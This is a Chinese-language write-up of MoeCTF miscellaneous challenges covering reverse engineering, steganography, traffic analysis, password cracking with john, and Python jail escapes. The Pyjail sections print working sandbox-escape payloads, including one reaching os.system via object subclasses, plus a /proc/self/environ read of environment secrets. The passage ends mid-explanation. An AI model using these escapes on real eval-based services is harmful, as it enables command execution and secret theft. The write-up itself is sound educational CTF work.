<!--markdownlint-disable MD033 MD036 MD041-->

<div align="center">

# 🔐 安全杂项 题解 🔑

</div>

## 2048_master ✅

> [!NOTE]
> **FLAG:** `moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}`

使用 IDA Pro 打开附件中的 `2048_master.exe`，在 `WinMain` 函数中找到 `WNDPROC` 函数 `sub_402F84()`。分析该函数，在第 243 行找到 `else if ( n20 == 1 )` 分支，注意到第 252 行和第 253 行，程序以 `CreateThread` 创建了两个线程 `StartAddress` 和 `sub_401E38`，`flag` 隐藏在其中或可由其得到的概率极大。

![使用 IDA Pro 分析 `WNDPROC` 函数](./analyze_WNDPROC_in_IDA_Pro.png)

这里，首先分析 `StartAddress`：

```c
void __fastcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
    unsigned int Seed; // eax
    int v2;            // eax
    int i;             // [rsp+2Ch] [rbp-4h]

    Seed = time64(0LL);
    srand(Seed);
    while (1)
    {
        v2 = rand();
        sub_4579D0(&unk_4B60F0, (char *)&unk_4B60C0 + 8 * (v2 % 4uLL));
        if (byte_4B60E0)
        {
            sub_4579A0(&unk_4B60F0, &unk_4950DC);
            for (i = 0; (unsigned __int64)i < 0x29; ++i)
                sub_457AE0(&unk_4B60F0, (unsigned int)(char)(byte_47F0C0[4 * i] ^ 0x2A));
        }
        InvalidateRect(hWnd, 0LL, 1);
        Sleep(0xFA0u);
    }
}
```

`StartAddress` 是一个线程函数，它使用当前时间 `time64(0LL)` 为随机数种子，接下来循环：

1. 生成一个随机数，并以该数进行一步难以言说的随机操作；
2. 随后以 `byte_4B60E0` 的值判断是否进行额外操作，若是，则对 `byte_47F0C0` 中的 41 个特定数据字节每 4 个地进行 XOR（与 `0x2A`）解码；
3. 对窗口进行 `InvalidateRect`，随后休眠 4 秒。

我们盲猜 `flag` 与 `byte_47F0C0` 有关，故使用 IDA Pro 提取出这部分数据：

```plain
.data:000000000047F0C0 ; _BYTE byte_47F0C0[192]
.data:000000000047F0C0 byte_47F0C0     db 47h, 3 dup(0), 45h, 3 dup(0), 4Fh, 3 dup(0), 49h, 3 dup(0)
.data:000000000047F0C0                                         ; DATA XREF: StartAddress+89↑o
.data:000000000047F0D0                 db 5Eh, 3 dup(0), 4Ch, 3 dup(0), 51h, 3 dup(0), 73h, 3 dup(0)
.data:000000000047F0E0                 db 1Ah, 3 dup(0), 5Fh, 3 dup(0), 75h, 3 dup(0), 1Eh, 3 dup(0)
.data:000000000047F0F0                 db 58h, 3 dup(0), 4Fh, 3 dup(0), 75h, 3 dup(0), 4Bh, 3 dup(0)
.data:000000000047F100                 db 75h, 3 dup(0), 18h, 3 dup(0), 1Ah, 3 dup(0), 1Eh, 3 dup(0)
.data:000000000047F110                 db 12h, 3 dup(0), 75h, 3 dup(0), 47h, 3 dup(0), 1Eh, 3 dup(0)
.data:000000000047F120                 db 59h, 3 dup(0), 5Eh, 3 dup(0), 19h, 3 dup(0), 58h, 3 dup(0)
.data:000000000047F130                 db 0Bh, 3 dup(0), 0Bh, 3 dup(0), 0Bh, 3 dup(0), 0Bh, 3 dup(0)
.data:000000000047F140                 db 58h, 3 dup(0), 1Ah, 3 dup(0), 4Fh, 3 dup(0), 58h, 3 dup(0)
.data:000000000047F150                 db 45h, 3 dup(0), 5Dh, 3 dup(0), 42h, 3 dup(0), 5Fh, 3 dup(0)
.data:000000000047F160                 db 57h, 7 dup(0), 40h, 0E1h, 47h, 15h dup(0)
```

手动分离出参与循环 XOR 的字节数据：

```plain
47, 45, 4F, 49, 5E, 4C, 51, 73, 1A, 5F, 75, 1E, 58, 4F, 75, 4B, 75, 18, 1A, 1E, 12, 75, 47, 1E, 59, 5E, 19, 58, 0B, 0B, 0B, 0B, 58, 1A, 4F, 58, 45, 5D, 42, 5F, 57
```

使用 CyberChef 进行 `From Hex` 和 `XOR` 即可得到 `flag`。

![使用 CyberChef 得到 `flag`](./get_flag_via_CyberChef.png)

```plain
moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}
```

> [!TIP]
> 本题亦有邪道做法，不过星澜音没研究出来。

## Misc 入门指北 ✅

> [!NOTE]
> **FLAG:** `moectf{We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!`

不难注意到，该 `flag` 以白色文本隐藏在题目给定的 PDF 文件中。

![`flag` 位于隐藏的白色文本中](./hidden_text_including_flag.png)

## Pyjail 0 ✅

> [!NOTE]
> 该题目的 `flag` 是随机的。

使用 `nc` 连接到目标服务器后，考虑题目提示的 Web Chapter 12 的 `flag` 位置，其位于环境变量中。我们猜测远程服务器使用 `cat` 打印文件内容，这下坏了，`cat` 怎么打印环境变量呢？我们借助 `/proc/self/environ` 完成这一点。

> [!TIP]
> `/proc` 是一个由 Linux 内核虚拟出来的文件系统，通常被称为 `procfs`，它为用户提供了一个窗口，可以用查看文件这种简单直观的方式，查看和修改内核及正在运行的进程的各种数据。例如，使用 `ls /proc` 可以看到许多以数字命名的目录，这些数字对应着系统的 进程 ID（PID），每个目录都包含了对应进程的详细信息。
>
> 为了方便起见，内核提供了一个特殊的符号链接（symlink）`/proc/self`，它永远指向当前正在访问 `/proc/self` 的那个进程的自己的信息目录。当我们使用 `cat` 尝试打开 `/proc/self/environ` 时，内核会首先将 `self` 转换为 `cat` 的 PID，随后直接为 `cat` 提供一份当前进程的环境变量列表的拷贝。这样就得到了 `environ`。

![使用 `/proc/self` 得到环境变量](./get_environ_via_proc_self.png)

## Rush ✅

> [!NOTE]
> **FLAG:** `moectf{QR_C0d3s_feATUR3_eRror_c0RRECt10N}`

使用工具逐帧提取题目给定的 `.gif` 文件，得到第 12 帧图片如下。

![`.gif` 文件的第 12 帧](./frame_12_of_rush.png)

不难发现这是一个残缺的二维码。判断该二维码的大小为 `37x37 (ver.5)`，根据给出的部分判断其纠错等级为 `H`，掩码图案为 `1`。使用工具补全该二维码并尝试解码即可。

![补全二维码并解码](./complete_QR_code_and_decode.png)

当然，注意到微信使用了鲁棒性极强的二维码识别库，星澜音道听途说，手动补全二维码的一个方块后直接使用微信扫码，亦可以得到 `flag`。该方法的可行性，星澜音仍未测试。

## ez_LSB ✅

> [!NOTE]
> **FLAG:** `moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}`

参考 [隐写技术 - Hello CTF](https://hello-ctf.com/hc-misc/stego/#lsb) 的内容，使用 StegSolve 的 Data Extract 功能，猜测并设置下图的参数，在解压出的数据最上部获得 `flag` 的 Base64 编码后内容。

![使用 StegSolve 提取数据](./extract_data_using_StegSolve.png)

使用任意 Base64 解码器解码后得到 `flag`。

## ez_锟斤拷???? ✅

> [!NOTE]
> **FLAG:** `moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}`

注意到「锟斤拷」是经典的 GBK 和 UTF-8 编码互转时出现的问题，我们直接使用编码恢复工具即可。需要注意的是得到的解码结果是全角字符，需要手动转为半角字符。

![使用编码恢复工具](./using_code_recover_tool.png)

## weird_photo ✅

> [!NOTE]
> **FLAG:** `moectf{Image_Height_Restored}`

使用 `pngcheck` 检验 `photo.png` 的 CRC 信息，直接发现问题：

```plain
┌──(stellalyrin㉿lyrin-A16)-[/mnt/s/MoeCTF/Misc]
└─$ pngcheck photo.png
zlib warning:  different version (expected 1.2.13, using 1.3.1)

photo.png  CRC error in chunk IHDR (computed d34d176f, expected b5a7bf8c)
ERROR: photo.png
```

这是诡异的。校正 CRC 信息至正确的高度可能有些困难，我们直接尝试部分拉长图片的高度信息。将图片使用 [HexEd.it](https://hexed.it) 打开后，更改第 17 个字节从 `01` 到 `02` 后另存为文件即可得到 `flag`。

![扩大图片以得到 `flag`](./get_flag_in_enlarged_photo.png)

Windows 11 的「照片」应用可以顺利打开被拉伸的图片，但似乎大多数平台均无法处理 CRC 信息错误的图片。这里不得不夸赞一次 Windows 11 的先进了（？）

## Pyjail 1 ✅

> [!NOTE]
> 该题目的 `flag` 是随机的。

审查一下 `src.py`：

```python
def chall():
    user_input = input("Give me your code: ")

    # 过滤关键字
    forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file']
    for keyword in forbidden_keywords:
        if keyword in user_input:
            print(f"Forbidden keyword detected: {keyword}")
            return
    
    result = eval(user_input)
```

好一波过滤关键字！这里我们给出 Payload 构造：

```python
print(getattr(__builtins__, 'o'+'p'+'e'+'n')('/tmp/flag.txt').read())
```

该 Payload 基于下面的原始 Payload 衍生。

```python
print(open('/tmp/flag.txt').read())
```

下面我们解释该 Payload 的原理。

> [!TIP]
> **首先，这里的** `__builtins__` **是什么？**
>
> 这里的 `__builtins__` 是一个模块，它包含了 Python 的所有内置函数、异常和属性。我们熟悉的 `print()`、`len()`、`open()` 和 `ValueError` 之类的东西都在这个模块里。Python 解释器会自动让 `__builtins__` 内的内置函数在任何地方均可用，这也是为什么我们并不需要 `import` 什么东西就可以直接使用 `print()`。事实上，当我们调用 `open()` 时，Python 就是在 `__builtins__` 中找到了它。
>
> **其次，这里的** `getattr()` **又是什么？**
>
> 这里 `getattr(object, name[, default])` 是一个内置函数，可用来动态获取一个对象的属性。其中，`object` 指从哪个对象获取属性，`name` 表示获取的属性的名字，`default` 返回一个属性不存在时的默认值，以代替 `AttributeError` 异常。比如说我们定义下面这样一个零音类：
>
> ```python
> class LyRin:
>     def patpat(self):
>         print("love")
>
> lyrin_instance = LyRin()
> ```
>
> 在一般的 Python 实践中，我们可以直接通过 `lyrin_instance.patpat()` 调用零音实例的 `patpat()` 方法，但我们也可以用 `getattr()` 做到这一点。这里，我们有
>
> ```python
> method_name = 'patpat'
> method = getattr(lyrin_instance, method_name)
> method()
> ```
>
> 它等价于直接的调用。
>
> **最后，刚才的关键字过滤…？**
>
> 我们再回过头看一下 `src.py` 中对 `open` 关键字的过滤：
>
> ```python
> if keyword in user_input:
> ```
>
> 注意到，它的关键字过滤是在 `user_input` 中匹配可能的 `keyword`，也就是说，它只会管 `user_input` 中连续出现的 `open` 四个字母。我们先前已经说过，由 `getattr()` 得到的对方法的调用，其 `method_name` 是一个字符串。既然是字符串，即使它过滤了 `open`，我们用 `'o'+'p'+'e'+'n'` 把它拼接出来不就好了吗？
>
> 综上，我们便得到了目标 Payload。

`nc` 连接远程服务器后，使用该 Payload 得到 `flag`。

```plain
Please enter the reverse of '8600L9KK' to continue: kk9l0068
Give me your code: print(getattr(__builtins__, 'o'+'p'+'e'+'n')('/tmp/flag.txt').read())
moectf{34543af2-7a7f-2cbd-c8cd-4ca263638a86}
```

## Pyjail 3 ✅

> [!NOTE]
> 该题目的 `flag` 是随机的。

审查一下 `src.py`：

```python
def chall():
    user_input = input("Give me your code: ")
        
    try:
        result = eval(user_input, {"__builtins__": None}, {})
        # Hint: When __builtins__ is None, you need to be more creative...
        print("Code executed successfully!")
        if result is not None:
            print(f"Return value: {result}")
    except Exception as e:
        print(f"Execution error: {type(e).__name__}: {e}")
```

不是，怎么给我 `__builtins__` 干成 `None` 了？这下没法直接用 `os` 和 `print` 这种东西了，那怎么办呢？有一天星澜音在晚上睡觉的时候，一位神给星澜音托梦，内容如下：

```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("cat /tmp/flag.txt")
```

星澜音惊醒后拿着笔赶紧写到纸上，第二天醒来后试了一下发现可行！哈哈哈😋

```plain
Give me your code: [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("cat /tmp/flag.txt")
moectf{30a5e97f-1a4c-0b95-b7d9-8e0952caa132}
Code executed successfully!
Return value: 0
```

下面我们解释该 Payload 的原理。

> [!TIP]
> 拆解这个 Payload：
>
> 首先看到 `''`，它是一个空字符串对象，我们使用 `.__class__` 可以获得它的类，即 `<class 'str'>`，字符串类。我们用 `.__base__` 获得它字符串类的基类（父类），在 Python 中几乎所有类都继承自 `<class 'object'>`，而 `<class 'str'>` 亦不例外。紧接着，我们再使用 `.__subclasses__()` 获得 `object` 类的所有直接子类，它会返回一个列表，列表中包含当前 Python 环境中所有可用的类（包括内置类、导入的模块中的类等）。如果你尝试过
>
> ```python
> ''.__class__.__base__.__subclasses__()
> ```
>
> 可以得到输出如下（有省略）：
>
> ```plain
> [<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, ...]
> ```
>
> 接下来我们使用 `for x in ... if x.__name=="_wrap_close"` 来从上述所有子类中遍历名为 `_wrap_close` 的类。这里的 `_wrap_close` 是 `os` 模块中的一个非常不起眼的类，它用于包装文件关闭操作。虽然我们不直接用到 `_wrap_close`，尽管 `_wrap_close` 微不足道，但它也是 `os` 的一部分——拿到了 `_wrap_close`，就拿到了 `os` 模块的家门！
>
> 然后，我们使用了 `x.__init__.__globals__`。首先对于 `os._wrap_close`，获得它的 `.__init__` 可以得到其构造函数 `<function os._wrap_close.__init__(self, stream, proc)>`；又因为它的构造函数与 `_wrap_close` 类定义在同一个模块中，所以它的构造函数的 `.__globals__` 指向的也是这个模块的全局命名空间，而这个模块，恰好，就是 `os`！也就是说，我们拿到了 `os` 模块的全局命名空间中的一切，包括它导入的其他模块、模块自身定义的函数、类和变量等等。我们又知道，`system` 函数就定义于 `os` 内（`os.system`），这下好说了，直接用键 `"system"` 取出 `os.system` 函数就好😋在 Linux 的 Python 上，可以得到 `os.system` 为 `<built-in function system>`，而 Windows 侧即 `<function nt.system(command)>`。
>
> 有了函数，后面跟着 `("command")` 就能调用了。接下来的一切，顺风顺水~

## SSTV ✅

> [!NOTE]
> **FLAG:** `moectf{d3codiNG_SStV_reQu1REs-PATI3nC3}`

使用线上 SSTV Decoder 可直接得到 `flag`。

![使用线上 SSTV Decoder](./online_sstv_decoder.png)

## encrypted_pdf ✅

> [!NOTE]
> **FLAG:** `moectf{Pdf_1s_r3a1ly_c0lor4ul!!ihdw}`

题目给定的 `attachment.zip` 中，`diary.txt` 给出提示

> So I will use a password that is simple enough.

这说明加密的 `不知道写什么.pdf` 采用弱密码。使用 `pdf2john` 提取哈希后，再使用 `john` 爆破即可，得到弱密码 `qwe123`。

![使用 `john` 爆破密码](./using_john_to_crack_pwd.png)

打开 PDF 后，在第 2 页得到了一个 ~~一个香香软软甜甜糯糯蜂蜜奶油甜甜腻腻酥酥脆脆滑滑嫩嫩番茄炒可乐番茄炒科比草莓蓝莓苹果香蕉葡萄香香甜甜酸酸甜甜辣辣爽爽咸咸鲜鲜苦苦甘甘滑滑嫩嫩酥酥脆脆软软绵绵弹弹润润油油腻腻清清爽爽浓浓醇醇淡淡幽幽热热乎乎冰冰凉凉黏黏糊糊爽爽脆脆鲜鲜嫩嫩辣辣麻苦苦辣辣苹果香蕉橙子草莓葡萄西瓜樱桃菠萝猕猴桃蓝莓桃子梨杏李子西红柿黄瓜胡萝卜生菜菠菜花椰菜卷心菜洋葱大蒜土豆红薯南瓜玉米豌豆扁豆红豆绿豆黄豆黑豆鸡蛋牛奶奶酪酸奶黄油面包面条米饭燕麦玉米片饼干蛋糕油鱼虾蟹龙虾贝类牛肉羊肉猪肉鸡肉鸭肉鹅肉火鸡肉香肠火腿培根肉丸汉堡热狗披萨寿司拉面咖喱炖肉烤肉烤鱼烤鸡沙拉汤粥蒸蛋豆腐豆浆豆奶豆腥草豆皮豆干芒果柠檬柚子金桔百香果火龙果牛油果无花果荔枝龙眼枇杷山楂桑葚甜瓜哈密瓜甜菜根莴苣茼蒿芥蓝芹菜荠菜苋菜意式烤蔬菜配香草酱和橄榄油鲜美多汁香脆可口滑嫩浓郁醇厚甘甜爽口香辣酸甜苦辣咸香酥软糯滑爽劲道鲜美清香扑鼻诱人色泽鲜艳香气扑鼻口感丰富层次分明风味独特香气四溢回味无穷色香味俱佳口感细腻肉质鲜嫩色泽金黄外酥里嫩香气浓郁味道鲜美口感滑嫩味道醇厚味道独特味道浓郁口感丰富味道鲜美味道醇厚味道独特香气扑鼻的~~ XDSEC 娘。根据题目提示，将 PDF 文件转换到 SVG 格式后，尝试寻找 `flag` 或 `moectf` 字样，但并未成功。

考虑到 `flag` 文本可能被 XDSEC 娘遮挡，我们

<div align="center">

😍😍 <img src="./xdsec_girl.png" alt="XDSEC 娘高清写真" width="150" height="150"> 😋😋

<h1>直接将 XDSEC 娘从屏幕里抱走</h1>

</div>

![移除 XDSEC 娘元素后得到 `flag`](./get_flag_after_removing_xdsec_girl.png)

于是得到了 XDSEC 娘和题目的 `flag`。

<div align="center">

**呜呜呜 XDSEC 娘你带我走吧✋😭🤚我什么 CTF 都会做的😭😭😭**

</div>

## 哈基米难没露躲 ✅

> [!NOTE]
> **FLAG:** `moectf{1b8956b9-a423-4101-a1bd-65be33682c82}`

**本年度最迷惑题目。**

打开附件 `hachimigo.zip` 中的 `はちみ語.txt`，得到（有省略）：

```plain
南北绿豆奈哪买噶奈哪买南北绿豆；欧莫季里噶奈哪买噶奈哦吗吉利。哦吗吉利哪买噶奈哪椰奶龙？哈基米买娜奈哪买北窝那没撸多。哈基米多多压那奈椰奶龙；奈诺娜美嘎哪买娜奈哪买窝那没撸多？哦吗吉利噶奈哪买哈基米；窝那没撸多噶奈哪买噶奈哪哈基米。库路曼波买噶奈哪买哦吗吉利，哈基米娜奈哪买北南北绿豆，哦吗吉利多多压那多多欧莫季里。阿西噶压压那南撸基阿奈诺娜美嘎，哈基米南里南北友里窝那没撸多。库路曼波一吉豆没咕椰奶龙，库路曼波吉豆没咕吉豆椰奶龙。库路曼波没咕吉豆没咕库路曼波？哦吗吉利吉豆没米吉库路曼波。阿西噶压豆耶咕吉豆没米窝那没撸多；南北绿豆吉豆没米哈基米；窝那没撸多吉豆没咕吉奈诺娜美嘎。库路曼波豆没咕吉豆椰奶龙，欧莫季里没咕吉豆没咕吉南北绿豆？库路曼波豆没米吉豆欧莫季里。哦吗吉利耶咕吉豆没咕奶哈基米；窝那没撸多压多那吉豆没咕奈诺娜美嘎。阿西噶压吉豆没咕吉哦吗吉利；椰奶龙豆没咕吉豆没咕南北绿豆。...
```

不是，要干啥？刚开始注意到连续出现神人词汇，例如「南北绿豆」、「哈基米」和「奶龙」一类，考虑是将字母和数字映射为这些重复词组，并且用随机连接词将它们拼为句子。但后来发现这些重复词汇仍然可能有增添、缺失、易位和倒位，无法完美组合成一句话，遂放弃。之后又考虑各种方案，仍不尽人意，只好丢给雾雨。谁知道……

![ChatGPT 尝试解决加密文本](./chatgpt_trying_solve_encrypted_text.png)

雾雨想了 9 分 27 秒，用了一堆方法尝试帮星澜音凑出答案😭雾雨真的，我哭死😭😭😭

但是答案还是没有凑出来的。雾雨尝试了分析和频率统计、acrostic / 句首首字母法、以及 `base-N` 映射、暴力枚举，中途写了一堆 Python 脚本，仍然未果，并建议星澜音尝试更大规模的暴力搜索，或者进行替换密码求解、语法分析等方法。哎，雾雨真的费尽心思了，星澜音也在想办法……

直到有天上网冲浪突然发现一个「哈基米语翻译器」……**这玩意原来是现成算法啊？**

![使用「哈基米语翻译器」解密](./decrypt_via_hajimi_translator.png)

😡😡😡心疼星澜音的同时更心疼雾雨😭只是这玩意为啥跑出来是 `fakeflag`？不对，复制到 `fakeflag.txt` 丢到 [HexEd.It](https://hexed.it) 一看，果不其然给我藏东西了😡😡

![使用零宽字符隐写的 `flag`](./encoded_flag_with_zerowidth_characters.png)

那咋办？星澜音这次绝对不手动解密了，必须在网上搜现成算法。果不其然，还真有这么个工具 [Unicode Steganography with Zero-Width Characters](https://www.rerizon.cn/ctf-tools/Zero-Width%20Characters/)。粘贴进去拿到 Hidden Text，这就是 `flag` 了。

![使用零宽字符隐写解密器](./use_steganography_tool_to_decode_text_with_zerowidth_characters.png)

做完之后回头一想：这毕竟是 Misc 题而不是 Crypto 题，下次还是先在网上找现成方案吧😭

## 捂住一只耳 ✅

> [!NOTE]
> **FLAG:** `moectf{HALF_RADIO_IN_XDU}`

解压 `li_zi_yi_shu.zip` 后得到 `粒子艺术.wav`。

> **"Particle Arts"**<br/>
> Performed by Virtual Self<br/>
> Written by Porter Robinson<br/>
> Courtesy of Virtual Self and mtheory<br/>
> By arrangement with Hidden Track Music

~~首先打开平板上的 Arcaea……哦不对，已经被下架了😭😭呜呜呜~~

注意到其中一个声道几乎没有声音，我们尝试使用 Audition 打开该 `.wav` 文件。注意到其中一个声道的波形呈现出摩斯密码状，手动解码即可。

Linux 下无法便捷地使用 Audition 等工具，故这里略去截图。

## Enchantment ✅

> [!NOTE]
> **FLAG:** `moectf{???}` <!--wc 我突然忘了这个 `flag` 是啥了😭-->

注意到附件内是一个 `.pcapng` 文件，考虑使用 WireShark 分析。根据题目说明，「发了出去」的请求可能是 HTTP 请求，为了验证这一点，我们使用 `Statistic` > `Protocol Hierarchy`（`统计` > `协议分级`）工具，发现大部分请求均为 `Internet Protocol Version 6` 和 `Internet Protocol Version 4`。

![协议分级统计](./procotol_hierarchy.png)

运用 Filter（过滤器），输入 `http` 后过滤出全体 HTTP 请求。注意到第 193 个请求是一个 HTTP POST 请求，其内容为一个 `PNG` 文件，于是锁定该文件。

![分析 HTTP 请求](./analyze_http_request.png)

我们使用 `File` > `Export Object` > `HTTP`（`文件` > `导出对象` > `HTTP`）导出第 193 个请求，手动移除该请求体的头尾后，得到 `enchantment.png`。

![`enchantment.png`](./enchantment.png)

注意到上面显示的是 Standard Galactic Alphabet（星际银河字母），使用 [解码器](https://www.dcode.fr/standard-galactic-alphabet) 即可。

## WebRepo ✅

> [!NOTE]
> **FLAG:** `moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}`
<!---->
> [!WARNING]
> 请不要扫描来路不明的二维码。

我们解压并扫描这个来路不明的二维码，得到下面的提示：

> Flag is not here, but I can give you a hint:
> Use binwalk.

这给了我们极大的提示，使用 `binwalk` 得到：

```plain
┌──(stellalyrin㉿lyrin-A16)-[/mnt/s/MoeCTF/Misc]
└─$ binwalk WebRepo.webp

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
16012         0x3E8C          7-zip archive data, version 0.3
```

注意到在 `0x3E8C` 后存在 7-zip 归档文件，我们使用 `dd` 来提取：

```bash
dd if=./WebRepo.webp of=./WebRepo.7z bs=1 skip=16012
```

得到 `WebRepo.7z`。使用 7-Zip 打开发现里面有一个 `.git` 文件，熟悉 Git 的朋友们一定知道这其中的奥秘了。

直接将 `.git` 文件夹拖拽到一个空文件夹中，使用 Visual Studio Code 的 Git 可视化工具读取名为 `flag` 的 commit 中提交的新文件即可。

## ez_ssl ✅

> [!NOTE]
> **FLAG:** `moectf{upI0@d-l0G_TO-DeCrYPT_uploAD}`

解包附件后得到一个 `.pcapng` 文件，故继续使用 WireShark 打开分析。我们发现，近乎大部分的流量都是 `TLSv1.2` 的，故我们必须要先解密这些 `HTTPS` 流量。考虑到题目所说的

> 但与此同时，他的浏览器却悄悄上传了另一份文件。

我们推测解密必需的 `CLINET_RANDOM` 就包含在这份 `.pcapng` 文件中。运用 Filter（过滤器）输入 `frame contains "CLIENT_RANDOM"` 后确得到第 243 个请求包含了 `CLIENT_RANDOM`。

![使用过滤器筛选 `CLIENT_RANDOM`](./filter_client_random.png)

我们固然可以追踪该请求的 TCP Stream，将其 `CLIENT_RANDOM` 提取后导入到 WireShark 中。不过，更简便的方法是直接将整个 `.pcapng` 文件导入到 WireShark，让后者智能地从文件中获得 `CLIENT_RANDOM`。

在 `Edit` > `Preferences` > `Protocols` > `TLS`（ `编辑` > `首选项` > `Protocols` > `TLS`）的 `(Pre)-Master-Secret log filename` 中直接选择该 `.pcapng` 文件即可。

![选择 `.pcapng` 文件提取 `CLIENT_RANDOM`](./select_master_secret.png)

> [!TIP]
>
> 星澜音的实践中，在 Linux 上直接选择 `.pcapng` 文件就好了，但是在 Windows 上却不行🤔这有啥说法吗……？

之后继续过滤全体 HTTP POST 请求，在 Filter（过滤器）中输入 `http.request.method == "POST" && http.content_type contains "multipart/form-data"`，过滤出请求 165 和 243，又由于 243 是传输 `CLIENT_RANDOM` 的请求，锁定 165 后，导出其对象，手动移除该请求体的头尾后，得到 `flag_extracted.zip`。

不过该 `flag_extracted.zip` 仍然有一层密码保护，在 7-Zip 的 文件 > 属性 中发现了注释

> 锘垮瘑鐮佷负7浣嶇函鏁板瓧

继续使用乱码恢复器进行恢复，发现是将 UTF-8 编码的文本以 GBK 形式打开。通过解码得到

> 密码为7位纯数字

准备使用 `john` 爆破。生成哈希后，我们使用增量模式爆破即可。

```bash
zip2john flag_extracted.zip > flag_extracted.john
john --incremental=Digits --min-length=7 --max-length=7 flag_extracted.john
```

得到密码 `6921682`。解压后得到 `flag.txt`（省略了部分）——

```plain
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. ...
```

无敌了……用 Ook 解密器即可。

## Pyjail 2 ✅

赏析一下 `src.py`：

```python
def chall():
    user_input = input("Give me your code: ")

    # 过滤关键字
    forbidden_keywords = ['import', 'eval', 'exec', 'open', 'file']
    for keyword in forbidden_keywords:
        if keyword in user_input:
            print(f"Forbidden keyword detected: {keyword}")
            return
    
    # 过滤特殊字符
    forbidden_chars = ['.', '_', '[', ']', "'", '"']
    for char in forbidden_chars:
        if char in user_input:
            print(f"Forbidden character detected: {char}")
            return

    result = eval(user_input)
```

666，还给我把特殊字符屏蔽了？好在这次终于自带 `__builtins__` 了，那还有啥好说的，想办法把特殊字符绕过就对了呗🤔只是这玩意绕过确实有点困难了。星澜音在这里继续直接给出构造：

```python
print(getattr(getattr(getattr(globals(),chr(103)+chr(101)+chr(116))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)),chr(111)+chr(112)+chr(101)+chr(110))(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))())
```

有人可能会问了，「星澜音你这又是哪个神在给你托梦？」这回还真不是神了，这回是星澜音翻博客翻出来的。（

首先，我们的目标一定是执行这一行代码，「祖宗之法不可变」：

```python
print(open('/tmp/flag.txt').read())
```

但是它既不能 `open`，也不能 `.`、`'`、`"`🤔怎么办呢？我们在 Pyjail 1 中讨论过，任何函数调用都可以转换为 `getattr()` 的形式，而 `getattr()` 的好处有很多：首先，它不会出现 `.`；其次，它的函数名是以 `str` 形式呈现的，而 `str` 的可操作性就大了：不仅可以像上次那样拼接，甚至可以用 `chr()` 的形式，直接输入其 ASCII 编码，让它在远程服务器转换为字母后再运行！

说干就干——根据「祖宗之法」，我们首先获取 `open` 函数。文件路径是相对碍事的，因为它自身还涉及到特殊符号，故我们先暂设 `STR_FLAG_PATH` 为 `"/tmp/flag.txt"`，先考虑函数调用的问题。我们从内到外地考虑，首先对于

```python
open(STR_FLAG_PATH)
```

由于 `open` 是过滤关键字，不存在这样的一种方法可以直接调用 `open()` 函数，思来想去，还是要借用 `getattr` 之力，从 `globals` 中取出 `open` 来。上例中我们对 `os._wrap_close.__init__` 函数取了 `.__globals__` 来获得其全局命名空间，从而获得 `__builtins__`；但这一次 `src.py` 并没有屏蔽 `eval()` 的 `__builtins__`，我们直接取 `__main__` 函数的 `.__globals__` 即可。这里的 Payload 更简单——只需 `globals()`。

```plain
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': '_pyrepl', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x73d874193890>, '__spec__': ModuleSpec(name='_pyrepl.__main__', loader=<_frozen_importlib_external.SourceFileLoader object at 0x73d874193890>, origin='/usr/lib/python3.13/_pyrepl/__main__.py'), '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/usr/lib/python3.13/_pyrepl/__main__.py', '__cached__': '/usr/lib/python3.13/_pyrepl/__pycache__/__main__.cpython-313.pyc'}
```

这样，我们的当务之急就是进入 `__builtins__` 了。不过，因为特殊字符串的问题，我们不能写 `globals()['__builtins__']`，也不能写 `globals().get('__builtins__')`，看来仍然需要 `getattr()` 发力：

```python
getattr(globals(), 'get')('__builtins__')
```

诶等等…！`__builtins__` 里不是有 `_` 了吗？甚至 `"get"` 里也有了 `"`，太碍事了：无妨，我们暂设 `STR_BUILTINS` 为 `"__builtins__"`，`STR_GET` 为 `"get"`，稍后再处理。现在就变成了：

```python
getattr(globals(), STR_GET)(STR_BUILTINS)
```

好耶！现在我们拿到了 `__builtins__`，我们就要获得它的 `open()` 函数。同样地，我们还是不能写 `__builtins__.open()`😡所以需要再次用 `getattr()`，得到

```python
getattr(__builtins__, 'open')
```

暂设 `STR_OPEN` 为 `"open"`，将 `__builtins__` 替换为上文，得到 `open(STR_FLAG_PATH)` 的最终形态：

```python
getattr( getattr(globals(), STR_GET)(STR_BUILTINS) , STR_OPEN)
```

好长一串😖现在我们拿到了 `open()`。我们先调用 `open`：

```python
getattr( getattr(globals(), STR_GET)(STR_BUILTINS) , STR_OPEN)(STR_FLAG_PATH)
```

